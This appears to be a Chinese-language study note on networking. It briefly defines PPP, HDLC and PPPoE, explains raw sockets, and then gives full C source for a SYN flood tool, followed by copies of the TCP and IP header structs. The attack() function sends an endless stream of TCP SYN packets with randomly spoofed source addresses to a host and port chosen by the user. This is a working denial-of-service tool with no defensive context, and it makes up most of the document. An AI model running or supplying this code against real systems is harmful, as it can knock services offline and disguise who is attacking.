# PPP & HDLC

PPP(Point-to-Point Protocol):点对点协议，链路层协议。PPP是为了在点对点物理链路上传输OSI模型中的网络层报文而设计的。

HDLC(High-Level Data Link Control,高级数据链路控制）：是一个在同步网上传输数据、面向比特的数据链路层协议。

PPP是面向字符，HDLC是面向位的。

PPP会话的建立，需要两端的设备都发送LCP数据包来配置和测试数据通信链路。

https://zhuanlan.zhihu.com/p/35206800



PPPOE，也就是Point to Point On Ethernet，也就是运行在以太网上的ppp协议，通俗来讲，就是先封装PPP数据帧，再将这个数据帧封装进以太网数据帧。旨在解决：用户认证、用户设备能够通过与运营商的自动协商来自动配置IP地址等问题。

创建面向连接的TCP和创建面向无连接的UDP套接字，在接收和发送时只能操作数据部分，而不能对IP首部或TCP和UDP首部进行操作。如果想要操作IP首部或传输层协议首部，就需要调用如下socket()函数创建网络层原始套接字。第一个参数指定协议族的类型为PF_INET，第二个参数为SOCK_RAW，第三个参数protocol为协议类型。



```c
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/tcp.h>


void attack(int skfd,struct sockaddr_in *target,unsigned short srcport);

unsigned short check_sum(unsigned short *addr,int len);

int main(int argc,char** argv){
    int skfd;
    struct sockaddr_in target;
    struct hostent *host;
    const int on=1;
    unsigned short srcport;
    if(argc!=4)
    {
        printf("Usage:%s target dstport srcport\n",argv[0]);
        exit(1);
    }
    bzero(&target,sizeof(struct sockaddr_in));
    target.sin_family=AF_INET;
    target.sin_port=htons(atoi(argv[2]));
    if(inet_aton(argv[1],&target.sin_addr)==0)
    {
        host=gethostbyname(argv[1]);
        if(host==NULL)
        {
            printf("TargetName Error:%s\n",hstrerror(h_errno));
            exit(1);
        }
        target.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
    }
    if(0>(skfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)))
    {
        perror("Create Error");
        exit(1);
    }
    if(0>setsockopt(skfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on)))
    {
        perror("IP_HDRINCL failed");
        exit(1);
    }
    setuid(getpid());
    srcport = atoi(argv[3]);
    attack(skfd,&target,srcport);
}
void attack(int skfd,struct sockaddr_in *target,unsigned short srcport)
{
    char buf[128]={0};
    struct ip *ip;
    struct tcphdr *tcp;
    int ip_len;
    ip_len = sizeof(struct ip)+sizeof(struct tcphdr);
    ip=(struct ip*)buf;
    ip->ip_v = IPVERSION;
    ip->ip_hl = sizeof(struct ip)>>2;
    ip->ip_tos = 0;
    ip->ip_len = htons(ip_len);
    ip->ip_id=0;
    ip->ip_off=0;
    ip->ip_ttl=MAXTTL;
    ip->ip_p=IPPROTO_TCP;
    ip->ip_sum=0;
    ip->ip_dst=target->sin_addr;
    tcp = (struct tcphdr*)(buf+sizeof(struct ip));
    tcp->source = htons(srcport);
    tcp->dest = target->sin_port;
    tcp->seq = random();
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->check = 0;
    while(1)
    {
        ip->ip_src.s_addr = random();
        tcp->check=check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
        sendto(skfd,buf,ip_len,0,(struct sockaddr*)target,sizeof(struct sockaddr_in));
    }
}
unsigned short check_sum(unsigned short *addr,int len){
    register int nleft=len;
    register int sum=0;
    register short *w=addr;
    short answer=0;
    while(nleft>1)
    {
        sum+=*w++;
        nleft-=2;
    }
    if(nleft==1)
    {
        *(unsigned char *)(&answer)=*(unsigned char *)w;
        sum+=answer;
    }
    sum=(sum>>16)+(sum&0xffff);
    sum+=(sum>>16);
    answer=~sum;
    return(answer);
}
```

```c
 ///usr/include/netinet
struct tcphdr    
{
    u_int16_t source;
    u_int16_t dest;
    u_int32_t seq;
    u_int32_t ack_seq;
#  if __BYTE_ORDER == __LITTLE_ENDIAN
    u_int16_t res1:4;
    u_int16_t doff:4;
    u_int16_t fin:1;
    u_int16_t syn:1;
    u_int16_t rst:1;
    u_int16_t psh:1;
    u_int16_t ack:1;
    u_int16_t urg:1;
    u_int16_t res2:2;
#  elif __BYTE_ORDER == __BIG_ENDIAN
    u_int16_t doff:4;
    u_int16_t res1:4;
    u_int16_t res2:2;
    u_int16_t urg:1;
    u_int16_t ack:1;
    u_int16_t psh:1;
    u_int16_t rst:1;
    u_int16_t syn:1;
    u_int16_t fin:1;
#  else
#   error "Adjust your <bits/endian.h> defines"
#  endif
    u_int16_t window;
    u_int16_t check;
    u_int16_t urg_ptr;
};

struct ip
  {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int ip_hl:4;       /* header length */
    unsigned int ip_v:4;        /* version */
#endif
#if __BYTE_ORDER == __BIG_ENDIAN
    unsigned int ip_v:4;        /* version */
    unsigned int ip_hl:4;       /* header length */
#endif
    u_int8_t ip_tos;            /* type of service */
    u_short ip_len;         /* total length */
    u_short ip_id;          /* identification */
    u_short ip_off;         /* fragment offset field */
#define IP_RF 0x8000            /* reserved fragment flag */
#define IP_DF 0x4000            /* dont fragment flag */
#define IP_MF 0x2000            /* more fragments flag */
#define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
    u_int8_t ip_ttl;            /* time to live */
    u_int8_t ip_p;          /* protocol */
    u_short ip_sum;         /* checksum */
    struct in_addr ip_src, ip_dst;  /* source and dest address */
  };

/usr/include/net/ethernet.h
```





